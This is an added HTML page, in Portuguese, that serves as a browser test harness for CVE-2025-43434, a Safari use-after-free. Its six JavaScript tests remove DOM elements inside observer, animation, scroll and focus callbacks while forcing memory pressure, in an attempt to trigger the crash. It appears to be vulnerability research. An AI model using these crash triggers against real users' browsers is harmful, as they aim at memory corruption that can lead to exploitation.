@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<title>CVE-2025-43434 — Google Big Sleep UAF (BZ#297958)</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#030206;color:#ddd;font-family:'Courier New',monospace;padding:16px;font-size:12px}
+h1{color:#00cccc;font-size:14px;margin-bottom:2px}
+.meta{color:#444;font-size:9px;margin-bottom:8px}
+.src{background:#000a0a;border:2px solid #005566;border-radius:5px;padding:10px;margin-bottom:10px;font-size:10px;color:#33aabb;line-height:1.8}
+.src strong{color:#00cccc;display:block;margin-bottom:4px}
+#log{background:#060608;border:1px solid #0a1a1a;border-radius:5px;padding:10px;min-height:200px;white-space:pre;overflow-y:auto;max-height:420px;font-size:11px;line-height:1.6}
+.ok{color:#44ff88}.w{color:#ffaa00}.e{color:#ff4444}.i{color:#00cccc}.sep{color:#333}
+.btn{display:inline-block;margin-top:10px;margin-right:5px;padding:7px 13px;background:#000a0a;border:1px solid #005566;border-radius:4px;color:#00aaaa;cursor:pointer;font:11px 'Courier New',monospace}
+.btn:hover{border-color:#00cccc;color:#00ffff}
+.back{display:inline-block;margin-top:10px;padding:7px 14px;background:#0d0d18;border:1px solid #222;border-radius:4px;color:#555;text-decoration:none;font-size:11px}
+</style>
+</head>
+<body>
+<h1>🤖 CVE-2025-43434 — Google Big Sleep AI UAF (BZ#297958)</h1>
+<p class="meta">Fonte: Google Big Sleep (LLM-powered fuzzer) · WSA-2025-0008 Nov/2025 · BZ#297958</p>
+<div class="src">
+<strong>📋 ANÁLISE — Google Big Sleep AI BZ#297958</strong>
+CVE: CVE-2025-43434 · Advisory: WSA-2025-0008<br>
+Impacto: "Processing maliciously crafted web content may lead to an unexpected Safari crash"<br>
+Fix: "A use-after-free issue was addressed with improved memory management"<br>
+<br>
+GOOGLE BIG SLEEP: AI fuzzer treinado para analisar diffs de commits e encontrar bugs<br>
+similares em componentes adjacentes. Descobriu múltiplos bugs simultâneos em Nov/2025:<br>
+  • BZ#297958 (CVE-2025-43434) — UAF "Safari crash"<br>
+  • BZ#298196 (CVE-2025-43430) — state management<br>
+  • BZ#298194 (CVE-2025-43431) — memory corruption<br>
+  • BZ#298232 (CVE-2025-43429) — buffer overflow<br>
+<br>
+PADRÃO AI FUZZER: Foca em APIs com state acumulado que pode ser invalidado externamente.<br>
+Suspeita: IntersectionObserver · ResizeObserver · Scrolling + overflow · Web Animations API
+</div>
+<div id="log">Aguardando...\n</div>
+<div>
+  <button class="btn" onclick="t1()">① IntersectionObserver UAF</button>
+  <button class="btn" onclick="t2()">② ResizeObserver + Remove</button>
+  <button class="btn" onclick="t3()">③ Web Animations Lifecycle</button>
+  <button class="btn" onclick="t4()">④ Scroll Container Destroy</button>
+  <button class="btn" onclick="t5()">⑤ Overflow + Dynamic Resize</button>
+  <button class="btn" onclick="t6()">⑥ Focus/Blur UAF Chain</button>
+  <button class="btn" onclick="runAll()">▶ Todos</button>
+</div>
+<a href="index.html" class="back">← Índice</a>
+<script>
+var L=document.getElementById('log');
+function l(m,c){L.innerHTML+=(c?'<span class="'+c+'">'+m+'</span>':m)+'\n';L.scrollTop=L.scrollHeight}
+function sep(t){l('─── '+t+' ───','sep')}
+function gc(){try{var a=[];for(var i=0;i<15;i++)a.push(new ArrayBuffer(1024*1024*2));a=null}catch(e){}}
+
+function t1(){
+  sep('IntersectionObserver UAF');
+  l('IntersectionObserver com targets removidos durante callback...','w');
+  try {
+    var container=document.createElement('div');
+    container.style.cssText='height:200px;overflow:auto;border:1px solid #333;position:relative';
+    document.body.appendChild(container);
+    var targets=[];
+    for(var i=0;i<30;i++){
+      var el=document.createElement('div');
+      el.style.cssText='height:80px;background:#'+Math.floor(Math.random()*0xffffff).toString(16).padStart(6,'0');
+      el.textContent='Target '+i;
+      container.appendChild(el);
+      targets.push(el);
+    }
+    var cbCount=0;
+    var obs=new IntersectionObserver(function(entries){
+      cbCount++;
+      entries.forEach(function(entry){
+        if(entry.isIntersecting && entry.target.parentNode){
+          // Remove o target DENTRO do callback
+          entry.target.parentNode.removeChild(entry.target);
+          gc(); // GC durante callback com entry ainda referenciando target
+        }
+      });
+    }, {root: container, threshold: 0.1});
+    targets.forEach(function(t){ obs.observe(t); });
+    // Scroll para disparar intersections
+    container.scrollTop=0;
+    setTimeout(function(){
+      container.scrollTop=500;
+      setTimeout(function(){
+        obs.disconnect();
+        if(container.parentNode) document.body.removeChild(container);
+        l('IntersectionObserver: '+cbCount+' callbacks sem crash','ok');
+      },300);
+    },100);
+    l('Observers configurados, scrollando...','i');
+  } catch(e){ l('CRASH IntersectionObserver: '+e.name,'e'); }
+}
+
+function t2(){
+  sep('ResizeObserver + Remove Durante Callback');
+  l('ResizeObserver: elemento redimensionado e removido no mesmo callback...','w');
+  try {
+    var container=document.createElement('div');
+    container.style.cssText='width:200px;position:relative';
+    document.body.appendChild(container);
+    var obs=new ResizeObserver(function(entries){
+      entries.forEach(function(entry){
+        var el=entry.target;
+        // Altera tamanho (dispara novo resize) E remove em sequência
+        el.style.width=(parseInt(el.style.width||100)+10)+'px';
+        if(parseInt(el.style.width)>200 && el.parentNode){
+          container.removeChild(el);
+          gc();
+        }
+      });
+    });
+    for(var i=0;i<10;i++){
+      var el=document.createElement('div');
+      el.style.cssText='width:50px;height:30px;background:#446688';
+      container.appendChild(el);
+      obs.observe(el);
+    }
+    setTimeout(function(){
+      obs.disconnect();
+      if(container.parentNode) document.body.removeChild(container);
+      l('ResizeObserver: sem crash','ok');
+    },600);
+    l('ResizeObservers iniciados...','i');
+  } catch(e){ l('CRASH ResizeObserver: '+e.name,'e'); }
+}
+
+function t3(){
+  sep('Web Animations API Lifecycle');
+  l('Animações canceladas/removidas durante playback + GC...','w');
+  try {
+    var host=document.createElement('div');
+    document.body.appendChild(host);
+    var animations=[];
+    for(var i=0;i<20;i++){
+      var el=document.createElement('div');
+      el.style.cssText='width:50px;height:50px;background:red;display:inline-block';
+      host.appendChild(el);
+      // Cria animação via Web Animations API
+      var anim=el.animate([
+        {transform:'translateX(0)', opacity:1},
+        {transform:'translateX(100px)', opacity:0}
+      ], {duration:1000, iterations:Infinity});
+      animations.push({anim:anim, el:el});
+    }
+    // Após um tick, cancela e remove alternadamente
+    setTimeout(function(){
+      animations.forEach(function(a, idx){
+        if(idx%2===0){
+          a.anim.cancel();
+          if(a.el.parentNode) host.removeChild(a.el);
+          gc();
+        }
+      });
+      // Ainda tenta acessar currentTime de animações cujos elementos foram removidos
+      animations.forEach(function(a){
+        try { var t=a.anim.currentTime; } catch(e2){}
+      });
+      animations.forEach(function(a){ try{a.anim.cancel();}catch(e2){} });
+      if(host.parentNode) document.body.removeChild(host);
+      l('Web Animations lifecycle: sem crash','ok');
+    },100);
+    l('20 animações iniciadas...','i');
+  } catch(e){ l('CRASH Web Animations: '+e.name,'e'); }
+}
+
+function t4(){
+  sep('Scroll Container Destroy Durante Scroll');
+  l('Container scroll destruído enquanto scroll event handler corre...','w');
+  try {
+    var outer=document.createElement('div');
+    outer.style.cssText='width:200px;height:150px;overflow:auto;position:fixed;top:0;left:0;z-index:9999';
+    document.body.appendChild(outer);
+    var inner=document.createElement('div');
+    inner.style.cssText='width:400px;height:600px;background:linear-gradient(red,blue)';
+    outer.appendChild(inner);
+    var scrollCount=0;
+    outer.addEventListener('scroll',function handler(){
+      scrollCount++;
+      if(scrollCount===5){
+        outer.removeEventListener('scroll',handler);
+        // Remove o container DENTRO do scroll handler
+        if(outer.parentNode) document.body.removeChild(outer);
+        gc();
+        l('Container removido no scroll handler #5','i');
+      }
+    });
+    // Programa vários scrolls
+    for(var i=1;i<=10;i++){
+      (function(n){ setTimeout(function(){ try{outer.scrollTop=n*50;}catch(e2){} },n*20); })(i);
+    }
+    setTimeout(function(){
+      if(outer.parentNode) document.body.removeChild(outer);
+      l('Scroll container: '+scrollCount+' scrolls sem crash','ok');
+    },400);
+  } catch(e){ l('CRASH scroll: '+e.name,'e'); }
+}
+
+function t5(){
+  sep('Overflow + Dynamic Resize Stress');
+  l('Elemento overflow com resize dinâmico e filhos adicionados/removidos...','w');
+  try {
+    var container=document.createElement('div');
+    container.style.cssText='width:200px;height:200px;overflow:hidden;resize:both;position:relative';
+    document.body.appendChild(container);
+    var children=[];
+    for(var i=0;i<50;i++){
+      var c=document.createElement('div');
+      c.style.cssText='width:'+(30+i*2)+'px;height:20px;background:#'+i.toString(16).padStart(2,'0')+'4488;float:left';
+      container.appendChild(c);
+      children.push(c);
+    }
+    // Alterna resize do container e remoção de filhos
+    for(var j=0;j<20;j++){
+      container.style.width=(200+j*5)+'px';
+      container.offsetWidth; // força reflow
+      if(children[j]&&children[j].parentNode) container.removeChild(children[j]);
+    }
+    container.style.width=''; // reset
+    container.offsetWidth;
+    document.body.removeChild(container);
+    l('Overflow + resize: sem crash','ok');
+  } catch(e){ l('CRASH overflow: '+e.name,'e'); }
+}
+
+function t6(){
+  sep('Focus/Blur Chain UAF');
+  l('Focus/blur em cadeia com elementos removidos durante handler...','w');
+  try {
+    var host=document.createElement('div');
+    document.body.appendChild(host);
+    var inputs=[];
+    for(var i=0;i<10;i++){
+      var inp=document.createElement('input');
+      inp.type='text'; inp.value='input'+i;
+      host.appendChild(inp);
+      inputs.push(inp);
+    }
+    var evCount=0;
+    inputs.forEach(function(inp,idx){
+      inp.addEventListener('focus',function(){
+        evCount++;
+        // Remove o próximo input na cadeia
+        var next=inputs[idx+1];
+        if(next&&next.parentNode) host.removeChild(next);
+        gc();
+      });
+      inp.addEventListener('blur',function(){
+        evCount++;
+      });
+    });
+    // Dispara focus/blur em todos
+    inputs.forEach(function(inp){
+      try { inp.focus(); inp.blur(); } catch(e2){}
+    });
+    if(host.parentNode) document.body.removeChild(host);
+    l('Focus/blur chain: '+evCount+' eventos sem crash','ok');
+  } catch(e){ l('CRASH focus/blur: '+e.name,'e'); }
+}
+
+function runAll(){
+  L.innerHTML='';
+  l('▶ CVE-2025-43434 — Google Big Sleep UAF (BZ#297958)','w');
+  l('Testando padrões AI fuzzer: Observers · Animations · Scroll · Overflow','i');
+  t1();
+  setTimeout(t2,700);setTimeout(t3,1400);setTimeout(t4,2000);
+  setTimeout(t5,2600);setTimeout(t6,3200);
+}
+</script>
+</body>
+</html>
